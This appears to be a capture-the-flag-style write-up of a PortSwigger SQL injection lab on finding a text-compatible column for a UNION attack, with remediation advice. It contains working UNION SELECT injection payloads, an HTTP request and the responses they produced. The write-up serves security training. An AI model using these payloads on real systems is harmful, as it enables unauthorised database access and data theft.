# SQL injection UNION attack, finding a column containing text

**Category:** SQL injection
**Level:** Practitioner
**Mechanism:** UNION — identifying a string-compatible column
**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

---

## Vulnerability

The product category filter is injectable and reflects query results in the response,
so it is exploitable with a `UNION` attack. Before data can be extracted, the attack
needs a column that accepts **string** data — that is where the extracted text will be
placed. This lab is the step that identifies which of the query's columns is
string-compatible.

## Reconnaissance & Exploitation

Column count first (from the previous lab's technique): three `NULL`s returned a valid
response, so the query has **3 columns**.

```
category=Pets' UNION SELECT NULL,NULL,NULL--   → HTTP/2 200 OK
```

To find the text column I replaced one `NULL` at a time with a string literal and
watched the status code. `NULL` fits any type, but a string only fits a text column —
so a type mismatch (string into a numeric column) throws a server error. The `500` is
the signal: *this column is not text*.

```
category=Pets' UNION SELECT 'a',NULL,NULL--          → 500   (column 1 not text)
category=Pets' UNION SELECT NULL,'Pr1DGc',NULL--     → 500   (column 2 not text)
category=Pets' UNION SELECT NULL,NULL,'Pr1DGc'--     → 200   (column 3 is text)
```

Column 3 accepted the string and the provided value appeared in the response:

```http
GET /filter?category=Pets' UNION SELECT NULL,NULL,'Pr1DGc'-- HTTP/2
Host: 0a7a00c0031ed728827ae8cc00f100d3.web-security-academy.net
```

```http
HTTP/2 200 OK
(the string "Pr1DGc" is rendered in the product list — lab solved)
```

The query returns 3 columns and the **third** is string-compatible. That is the slot a
real attack uses to return extracted data (usernames, passwords) in subsequent labs.

## Impact

On its own this is reconnaissance, but it is the second enabling step of a full
`UNION` extraction: with the column count and a known text column, an attacker places
real queried data into that column and reads it straight out of the response —
arbitrary data from any readable table. Confirming a reflected, string-compatible
column is the difference between a blind guess and a working data-exfiltration channel.

## Remediation

- Use parameterised queries (prepared statements); the `category` value must be bound,
  never concatenated into SQL.
- Do not reflect raw query output in a way that lets injected `UNION` rows surface in
  the response.
- Apply least privilege to the database account so the reachable tables and columns are
  minimal even if injection occurs.

## References

- **OWASP:** A03:2021 Injection
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)

## Notes

- Read the `500` as data, not failure: a string into a column that errors means the
  column is numeric, i.e. *not* the text column. Narrowing by elimination (col1 500,
  col2 500 → col3) is faster than guessing.
- `NULL` is type-agnostic (fits every column) — useful for counting columns, useless
  for testing type, because it never triggers the mismatch that reveals the text column.
- Gotcha that cost time here: the provided value is case-sensitive and mixes `1`/`l`
  and `0`/`O` — copy it from the lab banner, never retype it, and it refreshes if the
  lab reloads.
- Use single quotes for string literals. Backticks are identifiers (column/table
  names) in MySQL, not strings, so a backtick test gives misleading results.